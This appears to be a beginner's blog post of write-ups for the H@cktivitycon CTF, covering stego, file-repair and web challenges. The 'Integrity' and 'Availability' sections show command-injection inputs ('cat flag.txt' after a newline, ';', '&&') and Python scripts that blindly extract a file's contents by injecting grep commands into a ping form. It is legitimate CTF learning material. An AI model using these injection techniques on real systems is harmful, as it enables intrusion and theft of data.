---
layout: post
title: "H@cktivitycon CTF Writeups"
author: Ainchentmew2
---

Before now, I've had no experience in anything involving Cybersecurity, but when I heard about the CTF run by John Hammond, congon4tor, M_alpha, fumenoid, NightWolf, Blacknote, and CalebStewart, I figured it'd be a great learning experience for me.


I spent several hours researching and learning, in hopes of building up my abilities before the CTF.

When it came time to start, I felt like I'd be a little useless and not have much to bring to the team, but it turned out that I actually solved seven challenges (and enterd the flag for one a teammate solved), netting  me just over 1100 points.


In this post, I'm going to be detailing my thought process and how I found each flag, based on the order I completed them in.

## Tsunami
#### Description: "Woah! It's a natural disaster! But something doesn't seem so natural about this big wave..."

Nobody on my team seemed interested in trying this one, as it involved an audio file and none of us had headphones.
Checking the file type, I found that "tsunami" was a .wav file, so I renamed it accordingly.

![Tsunami 1](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Tsunami2.png)

I figured maybe there was something hidden in the visualization in the wave itself, so I tried opening it in sonic visualiser.

![Tsunami 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Tsunami3.png)

I couldn't find anything right away, but I looked at the spectrogram view and zoomed in a little towards the end, and the flag was right there in plaintext!

![Tsunami 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Tsunami4.png)

## Bass 64
#### Description: "It, uh... looks like someone bass-boosted this? Can you make any sense of it?"

Reading this file gave quite a weird result.

![Bass64 1](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Bass642.png)

I wonder what happens when I zoom out the terminal...

![Bass64 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Bass643.png)

Based on the hint, I assumed this was encoded via base 64, and ran the string through a decoder, giving me the flag!

![Bass64 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Bass644.png)

## Target Practice
#### Description: "Can you hit a moving target?"

This one was a gif that looked a little like a target with vibrating dots on the outside of the target.

![Target Practice](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/target_practice.gif)

I noticed that frame 16 looked a little odd compared to the rest, based on the top left corner sticking out, so I split apart the frames and extracted frame 16. 

![Target Practice 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Target_Practice2.gif)

I wondered what I could do with the image, and realized it looked a little like a QR code. Upon searching for circular QR codes, I found out that the image was actually a Maxi code, and scanning it gave the flag!

![Target Practice 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Target_Practice3.png)

## Butter Overflow
#### Description: "Can you overflow this right?"

This one was a little fun to me.
Connecting to the port, you're asked a simple question: "How many bytes does it take to overflow this buffer?" Upon any answer, you're immediately disconnected from the port.

![Butter Overflow](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Butter_Overflow3.png)

I assumed I needed to overflow the buffer, so I did what any sane person would do, and held the letter 'a' for a minute or so.

![Butter Overflow 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Butter_Overflow2.png)

Success!

## 2ez
#### Description: "These warmups are just too easy! This one definitely starts that way, at least!"

For this challenge, you're simply given a data file that cannot be opened.

Opening this with the hex editor, we find that the file is a .jfif file that is missing the proper header.

![2ez](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/2ez2.png)

After doing a little bit of research, I found that the proper header for a .jfif file is ```FF D8 FF E0```

I simply added this header to the image, allowing me to open it for the flag!

![2ez2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/2ez3.png)

## Integrity
#### Description: "My school was trying to teach people about the CIA triad so they made all these dumb example applications... as if they know anything about information security. Supposedly they learned their lesson and tried to make this one more secure. Can you prove it is still vulnerable?"

This challenge involved a web application to verify the SHA256 hash of any file.

![Integrity](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Integrity2.png)

This one is basically a sequel to the challenge "Confidentiality," which was solved by one of my teammates.

Confidentiality involved just using ```;``` or ```&&``` to add another command to read the flag, but in Integrity, almost all characters were filtered.

My research brought me towards using burpsuite to injecting my own code into their application.
I wasn't too confident in this solution, but I tried entering a new line with the command ```cat flag.txt```

![Integrity 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Integrity3.png)

Surprisingly enough, this worked perfectly!

![Integrity 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Integrity4.png)

## Availability
#### Description: "My school was trying to teach people about the CIA triad so they made all these dumb example applications... as if they know anything about information security. They said they fixed the bug from the last app, but they also said they knew they went overboard with the filtered characters, so they loosened things up a bit. Can you hack it?"

This one was honestly the most enjoyable out of all the challenges. It was basically the same thing as the Integrity, with a web application that pings a port and gives outputs the success of the ping.

![Availability](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Availability2.png)

I tried the same thing I did with Intregrity, but instead of displaying the flag, it just gave me a successful ping.

Experimenting a little bit, I changed the ip to something I knew would be unsuccessful and tried ```cat flag.txt```

This time, I received a failed ping.


Knowing this, I figured it would be possible to use the requests module on python in order to use the ```grep``` command to search for letters in the flag.

Here was my quick script to build up a character dictionary of possible letters:
```python
import requests
character_dictionary = ''
characters = 'abcdefghijklmnopqrstuvwxyz1234567890'

for char in characters:
    payload = """
    grep {letter} "flag.txt"
    """.format(letter=char)
    print(character_dictionary, char)
    r = requests.post('http://challenge.ctf.games:31862/', data={'host':payload})
    if 'Success' in r.text:
        character_dictionary += char
print(character_dictionary)
```

And here was the output:

![Availability 2](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Availability3.png)

Knowing the characters in the flag can now allow me to figure out exactly what the flag is, using a very similar script:

```python
import requests
flag = ''
characters = 'abcdfgl124567890'

for i in range(32):
    for char in characters:
        payload = """
        grep {letter} "flag.txt"
        """.format(letter=flag+char)
        print(flag, char)
        r = requests.post('http://challenge.ctf.games:31862/', data={'host':payload})
        if 'Success' in r.text:
            flag += char
            break
print(flag)
```

And here was the output:

![Availability 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Availability4.png)

This means that the flag ends with the sequence 'bf60'

Knowing this, I can use the exact same script, but looking for letters starting from the end and working backwords.

Here was the script I used:

```python
import requests
flag = 'bf60'
characters = 'abcdfgl124567890'

for i in range(28):
    for char in characters:
        payload = """
        grep {letter} "flag.txt"
        """.format(letter=char+flag)
        print(flag, char)
        r = requests.post('http://challenge.ctf.games:31862/', data={'host':payload})
        if 'Success' in r.text:
            flag=char+flag
            break
print(flag)
```

And here was the output:

![Availability 3](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Availability6.png)

And that was the correct flag!


# Final thoughts

Overall I had a blast and really enjoyed the CTF, and I'm glad I decided to try it out. Big thanks to Ryan (An00bRektn) for helping me out and introducing me to the CTF, and for giving me the idea to make my own writeups! Check out his write ups [here](https://an00brektn.github.io/).

I'm definitely looking forward to the next one!

![Congrats!](https://raw.githubusercontent.com/Ainchentmew2/ainchentmew2.github.io/main/images/Hacktivity.png)

[Back to Home Page](https://ainchentmew2.github.io)
